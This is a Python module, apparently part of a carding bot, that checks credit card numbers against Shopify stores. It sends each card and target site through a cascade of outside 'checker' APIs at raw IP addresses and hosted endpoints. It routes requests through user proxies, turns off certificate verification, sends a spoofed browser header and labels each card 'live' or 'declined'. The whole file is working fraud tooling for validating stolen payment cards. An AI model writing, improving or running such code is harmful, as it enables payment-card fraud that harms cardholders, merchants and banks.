"""
checker_bridge.py — Shopify checker bridge (multi-API, multi-format).

Endpoints (priority order — first working one wins):
  1. http://5.175.222.144:8081                  (shopii style: ?site=&cc=)
  2. https://shopii-hdiy.onrender.com/shopify   (shopii style — confirmed)
  3. https://cumseeapi.onrender.com/check       (cumsee style: ?card=&url=&proxy=&low=true)
  4. https://vipxcon.com/shopify                (shopii style — currently 530)
  5. http://2.25.146.244:8080/shopify           (shopii style — backup)

bot.py calls check_card_site(cc, site, proxy).
"""

import asyncio
import logging
from urllib.parse import quote

import httpx

log = logging.getLogger("checker_bridge")


# ══════════════════════════════════════════════════════════════════════════════
#  API REGISTRY — each entry knows its own request format
# ══════════════════════════════════════════════════════════════════════════════

# format values:
#   "shopii"  → ?site=<domain>&cc=<cc>
#   "cumsee"  → ?card=<cc>&url=<url>&proxy=<host:port:user:pass>&low=true

API_ENDPOINTS = [
    {"url": "http://5.175.222.144:8081",              "format": "shopii"},
    {"url": "https://shopii-hdiy.onrender.com/shopify","format": "shopii"},
    {"url": "https://cumseeapi.onrender.com/check",   "format": "cumsee"},
    {"url": "https://vipxcon.com/shopify",            "format": "shopii"},
    {"url": "http://2.25.146.244:8080/shopify",       "format": "shopii"},
]

REQUEST_TIMEOUT = 25.0
TOTAL_DEADLINE  = 60.0


# ══════════════════════════════════════════════════════════════════════════════
#  PROXY HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _proxy_url(proxy) -> str | None:
    """HTTP URL form: http://user:pass@host:port — for httpx client routing."""
    if not proxy:
        return None
    if isinstance(proxy, str):
        return proxy.strip() or None
    if isinstance(proxy, dict):
        return (
            proxy.get("proxy_url")
            or proxy.get("url")
            or (f"http://{proxy['ip']}:{proxy['port']}"
                if proxy.get("ip") and proxy.get("port") else None)
        )
    return None


def _proxy_apistring(proxy) -> str | None:
    """API string form: host:port:user:pass — for cumsee's proxy param."""
    if not proxy:
        return None
    if isinstance(proxy, str):
        raw = proxy.strip()
        if not raw:
            return None
        # strip scheme, convert user:pass@host:port → host:port:user:pass
        for pre in ("http://", "https://", "socks5://", "socks4://"):
            if raw.startswith(pre):
                raw = raw[len(pre):]
        if "@" in raw:
            auth, hp = raw.rsplit("@", 1)
            user, pw = (auth.split(":", 1) + [""])[:2]
            host, port = (hp.rsplit(":", 1) + [""])[:2]
            if host and port and user and pw:
                return f"{host}:{port}:{user}:{pw}"
        # already host:port or host:port:user:pass
        return raw
    if isinstance(proxy, dict):
        ip = str(proxy.get("ip") or "").strip()
        port = str(proxy.get("port") or "").strip()
        user = str(proxy.get("username") or "").strip()
        pw = str(proxy.get("password") or "").strip()
        if ip and port and user and pw:
            return f"{ip}:{port}:{user}:{pw}"
        if ip and port:
            return f"{ip}:{port}"
    return None


# ══════════════════════════════════════════════════════════════════════════════
#  RESPONSE NORMALIZATION
# ══════════════════════════════════════════════════════════════════════════════

def _normalize(raw: dict, cc: str, site: str, endpoint: str) -> dict:
    # ── Response text: both APIs use "Response" but keep fallbacks ─────────
    response = (
        str(raw.get("Response") or raw.get("response") or
            raw.get("message")  or raw.get("msg") or "").strip()
        or "Unknown"
    )

    # ── Price ──────────────────────────────────────────────────────────────
    price_val = raw.get("Price", raw.get("price", 0))
    currency  = str(raw.get("Currency") or raw.get("currency") or "").strip()
    try:
        p = float(price_val)
    except (TypeError, ValueError):
        p = 0.0

    if p <= 0:
        price = "-"
    elif currency:
        price = f"${p:.2f} {currency}"
    else:
        price = f"${p:.2f}"

    # ── Gate name ──────────────────────────────────────────────────────────
    gate = str(
        raw.get("Gateway") or raw.get("gate") or
        raw.get("Gate")    or raw.get("gateway") or "Shopify"
    ).strip()

    # ── Status (bot reads Response primarily) ──────────────────────────────
    sb = raw.get("Status", raw.get("status"))
    if isinstance(sb, bool):
        status = "live" if sb else "declined"
    else:
        status = str(sb or "Unknown")

    return {
        "Response": response,
        "Price":    price,
        "Gate":     gate,
        "Status":   status,
        "site":     site,
        "cc":       cc,
        "endpoint": endpoint,
        "Currency": currency,
        "Proxy":    str(raw.get("Proxy") or raw.get("proxy") or "").strip(),
        "Time":     str(raw.get("Time") or raw.get("time") or "").strip(),
    }


# ══════════════════════════════════════════════════════════════════════════════
#  REQUEST BUILDER PER FORMAT
# ══════════════════════════════════════════════════════════════════════════════

def _params_for(format_: str, cc: str, site_clean: str, proxy_apistring: str | None) -> dict:
    if format_ == "cumsee":
        p = {
            "card": cc,
            "url":  f"https://{site_clean}",
            "low":  "true",
        }
        if proxy_apistring:
            p["proxy"] = proxy_apistring
        return p
    # shopii default
    return {"site": site_clean, "cc": cc}


def _url_with_params(endpoint: str, params: dict) -> str:
    """Pre-encode `|` and other reserved chars so the API doesn't 422."""
    qs = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in params.items())
    return f"{endpoint}?{qs}"


# ══════════════════════════════════════════════════════════════════════════════
#  PUBLIC API
# ══════════════════════════════════════════════════════════════════════════════

async def check_card_site(
    cc: str,
    site: str | None = None,
    proxy: dict | None = None,
) -> dict:
    """
    Check a CC against a Shopify site via the API cascade.

    Tolerates either argument order:
        check_card_site(cc, site, proxy)   ← bot.py uses this
        check_card_site(cc, proxy, site)   ← also accepted
    """
    # ── Swap tolerance ─────────────────────────────────────────────────────
    if isinstance(site, dict) and not isinstance(proxy, dict):
        site, proxy = None, site

    site = site or "shop.myshopify.com"
    site_clean = site.replace("https://", "").replace("http://", "").strip("/")

    proxy_url       = _proxy_url(proxy)
    proxy_apistring = _proxy_apistring(proxy)

    client_kwargs = {
        "timeout": httpx.Timeout(REQUEST_TIMEOUT, connect=10.0),
        "verify": False,
        "follow_redirects": True,
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/131.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
        },
    }
    # NOTE: we do NOT route the bot's HTTP request through the user proxy —
    # the APIs themselves handle the proxy (esp. cumsee via ?proxy=...).
    # Routing through proxy here would double-proxy and slow things down.

    loop = asyncio.get_running_loop()
    deadline = loop.time() + TOTAL_DEADLINE
    last_error = None

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            for entry in API_ENDPOINTS:
                if loop.time() >= deadline:
                    log.warning("checker_bridge: total deadline hit")
                    break

                endpoint = entry["url"]
                fmt      = entry["format"]
                params   = _params_for(fmt, cc, site_clean, proxy_apistring)
                full_url = _url_with_params(endpoint, params)

                try:
                    r = await client.get(full_url)
                    if r.status_code != 200:
                        last_error = f"{endpoint} HTTP {r.status_code}"
                        log.info("checker_bridge: %s → HTTP %s", endpoint, r.status_code)
                        continue

                    raw = r.json()
                    if not isinstance(raw, dict):
                        log.info("checker_bridge: %s bad payload type", endpoint)
                        continue

                    # Must have "Response" or "Gateway" to be useful
                    if not (raw.get("Response") or raw.get("Gateway")
                            or raw.get("response")):
                        log.info("checker_bridge: %s payload missing Response/Gateway: %s",
                                 endpoint, str(raw)[:120])
                        continue

                    result = _normalize(raw, cc, site, endpoint)
                    log.info("checker_bridge: HIT via %s → %s",
                             endpoint, result["Response"][:60])
                    return result

                except Exception as e:
                    last_error = f"{endpoint}: {e}"
                    log.warning("checker_bridge: %s errored: %s", endpoint, e)
                    continue

    except Exception as e:
        last_error = str(e)
        log.error("checker_bridge: fatal error: %s", e, exc_info=True)

    log.error("checker_bridge: all endpoints failed, last=%s", last_error)
    return {
        "Response": "ALL_APIS_DOWN",
        "Price":    "-",
        "Gate":     "-",
        "Status":   "Error",
        "site":     site,
        "cc":       cc,
        "endpoint": None,
    }